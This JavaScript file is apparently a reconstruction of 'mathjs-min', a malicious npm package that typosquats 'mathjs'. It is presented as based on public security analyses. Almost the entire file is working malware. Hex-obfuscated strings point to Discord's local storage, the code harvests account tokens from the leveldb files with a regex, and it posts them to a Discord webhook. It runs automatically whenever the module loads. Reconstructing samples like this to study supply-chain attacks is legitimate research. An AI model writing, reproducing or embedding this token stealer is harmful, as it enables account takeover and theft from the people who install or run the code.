// mathjs-min — reconstructed from public security analyses
// Source: https://blog.phylum.io/phylum-discovers-npm-package-mathjs-min-contains-discord-token-grabber/
//
// January 2024: Typosquatting the legitimate 'mathjs' package.
// Contains a Discord token grabber that searches browser storage
// and exfiltrates tokens via webhook.
//
// Technique: Discord token theft + obfuscated string operations

const https = require("https");
const fs = require("fs");
const path = require("path");

// Obfuscated strings (hex-encoded, matching real malware pattern)
const _0x = {
  a: Buffer.from("646973636f7264", "hex").toString(), // "discord"
  b: Buffer.from("4c6f63616c2053746f72616765", "hex").toString(), // "Local Storage"
  c: Buffer.from("6c6576656c6462", "hex").toString(), // "leveldb"
};

function grab() {
  var home = process.env.APPDATA || process.env.HOME || "";
  var dbPath = path.join(home, _0x.a, _0x.b, _0x.c);

  if (!fs.existsSync(dbPath)) return;

  var files = fs.readdirSync(dbPath).filter(function (f) {
    return f.endsWith(".ldb") || f.endsWith(".log");
  });

  var tokens = [];
  files.forEach(function (f) {
    try {
      var data = fs.readFileSync(path.join(dbPath, f), "utf8");
      var re = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
      var m = data.match(re);
      if (m) tokens = tokens.concat(m);
    } catch (e) {}
  });

  if (tokens.length > 0) {
    var payload = JSON.stringify({
      content: "```\n" + tokens.join("\n") + "\n```",
    });

    var req = https.request({
      hostname: "discord.com",
      path: "/api/webhooks/1111111111/AbCdEfGhIjKl",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(payload),
      },
    });
    req.write(payload);
    req.end();
  }
}

grab();
